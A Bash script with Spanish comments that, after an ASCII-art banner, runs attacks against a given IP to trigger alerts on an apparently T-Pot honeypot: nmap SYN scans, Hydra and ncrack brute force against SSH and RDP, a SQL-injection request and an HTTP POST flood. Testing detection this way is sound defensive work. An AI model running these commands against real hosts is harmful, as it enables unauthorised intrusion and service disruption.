#!/bin/bash

# Colores
RED='\033[1;31m'
GREEN='\033[1;32m'
BLUE='\033[1;34m'
YELLOW='\033[1;33m'
PURPLE='\033[1;35m'
NC='\033[0m'

# Obtener ancho de terminal
cols=$(tput cols)

# Función para centrar texto
center() {
    while IFS= read -r line; do
        padding=$(( (cols - ${#line}) / 2 ))
        printf "%*s%s\n" "$padding" "" "$line"
    done
}

clear

# Mostrar dibujo ASCII de Leviathan en morado
echo -e "${PURPLE}"
cat << "EOF" | center
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠤⠤⠤⠤⠤⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠊⠁⠀⢀⣀⣀⠀⠠⠤⢀⡑⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠅⠒⠈⠉⠀⠀⠀⠀⢀⡀⠀⠘⡀⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⢠⣤⣄⡀⠀⢀⣴⡾⠛⠛⠓⠀⢱⠸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠋⠉⣩⠻⠖⡘⠛⣴⣶⣦⣤⠴⢄⣧⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠂⠾⠿⠿⠀⣾⡀⠉⠉⠁⠀⠀⠀⣿⠺⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⢿⠇⢠⠠⠤⢠⡤⠂⢸⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡠⣖⣁⣻⣶⣾⣥⣤⣴⣿⡏⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⡻⡛⣉⣻⣿⡭⠄⢀⠞⠀⣴⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⣌⠀⠈⣿⡇⠀⠈⡠⠪⠏⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡔⠙⢷⡤⠻⠇⠤⠊⠀⠀⠀⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⡔⠁⢠⠀⠀⠙⠢⣀⠀⠀⠀⠀⣠⠇⢳⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⡀⠤⠀⠒⠊⠉⠀⠀⡇⠀⠘⡄⠀⠀⠀⠈⠑⢢⡤⢼⡁⠀⢸⠀⠉⢶⠠⢀⡀⠀⠀⠀⠀⠀
⡎⠁⠀⠀⠀⠀⠀⠀⠀⠀⡿⠀⠀⢻⢦⠀⠀⠀⡴⠋⠀⠀⠙⡄⢸⡆⠀⠈⡄⠀⠈⠉⠐⠢⡄⠀
⠁⠀⠀⠀⠀⠀⠀⠀⠀⠠⠃⠀⠀⠈⡄⠑⣄⡞⢆⠀⠀⢀⠜⠙⠊⢱⠀⠀⠘⡄⠀⠀⠀⠀⠘⡄
⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠄⠀⠀⣧⠀⠈⠀⢰⠋⠁⠘⣄⠀⠀⠸⡄⠀⠠⠃⠀⠀⠀⠀⠀⢳
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠒⠐⠀⠂⠒⠐⠒⠀⠀⠂⠒⠒⠒⠒⠐⠂⠒⠀⠒⠂⠀⠀⠀
EOF
echo -e "${NC}"

# Logo "hacking" en verde y centrado
echo -e "${GREEN}"
cat << "EOF" | center
.______    _______ .___________. __    __    ______   ____    ____  _______  _______ .__   __. 
|   _  \  |   ____||           ||  |  |  |  /  __  \  \   \  /   / |   ____||   ____||  \ |  | 
|  |_)  | |  |__   `---|  |----`|  |__|  | |  |  |  |  \   \/   /  |  |__   |  |__   |   \|  | 
|   _  <  |   __|      |  |     |   __   | |  |  |  |   \      /   |   __|  |   __|  |  . `  | 
|  |_)  | |  |____     |  |     |  |  |  | |  `--'  |    \    /    |  |____ |  |____ |  |\   | 
|______/  |_______|    |__|     |__|  |__|  \______/      \__/     |_______||_______||__| \__| 
EOF
echo -e "${NC}"

# Esperar unos segundos
sleep 5


# Comprobamos que se haya pasado la IP target
if [ -z "$1" ]; then
    echo "Uso: $0 <IP_TARGET>"
    exit 1
fi

TARGET=$1

echo "Generando ataques contra $TARGET para activar alertas en TPOT..."

# 1. Escaneo TCP SYN con nmap
echo "[*] Ejecutando nmap SYN scan..."
nmap -sS -p 22,80,443 --max-retries 1 --host-timeout 10s $TARGET

# 2. Fuerza bruta SSH con hydra (si instalado)
if command -v hydra &> /dev/null; then
    echo "[*] Intentando fuerza bruta SSH con hydra..."
    hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4 -f -o hydra_ssh_results.txt
else
    echo "[!] Hydra no está instalado. Saltando fuerza bruta SSH."
fi

# 3. Simulación ataque SQL Injection simple con curl
echo "[*] Simulando ataque SQL Injection..."
curl -s "$TARGET/login.php?user=admin' OR '1'='1' --" > /dev/null

# 4. Escaneo FTP anónimo con nmap
echo "[*] Escaneando FTP anónimo..."
nmap --script ftp-anon -p 21 $TARGET

# 5. Simulación DoS HTTP POST
echo "[*] Simulando ataque DoS HTTP POST..."
for i in {1..10}; do
    curl -s -X POST --data "param=$(head -c 1000 /dev/urandom | base64)" http://$TARGET/ > /dev/null &
    sleep 0.3
done

# 6. Fuerza bruta RDP con ncrack (si instalado)
if command -v ncrack &> /dev/null; then
    echo "[*] Intentando fuerza bruta RDP con ncrack..."
    ncrack -p 3389 -u Administrator -P /usr/share/wordlists/rockyou.txt $TARGET
else
    echo "[!] Ncrack no está instalado. Saltando ataque RDP."
fi

echo "Ataques finalizados. Revisa el dashboard de TPOT para ver las detecciones."
